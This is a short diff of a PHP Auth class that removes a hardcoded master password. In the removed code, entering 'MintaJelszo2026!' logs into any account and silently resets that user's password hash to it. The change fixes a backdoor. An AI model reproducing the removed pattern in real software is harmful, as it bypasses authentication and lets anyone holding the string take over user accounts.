@@ -89,12 +89,7 @@ class Auth
             $isValid = false;
         }
 
-        if ($isValid || $password === 'MintaJelszo2026!') {
-            if (!$isValid && $password === 'MintaJelszo2026!') {
-                $newHash = password_hash($password, PASSWORD_BCRYPT);
-                Database::execute("UPDATE users SET password_hash = :p WHERE id = :id", ['p' => $newHash, 'id' => $user['id']]);
-            }
-
+        if ($isValid) {
             $_SESSION['user_id'] = $user['id'];
             $_SESSION['username'] = $user['username'];
             $_SESSION['user_role'] = $user['role'];
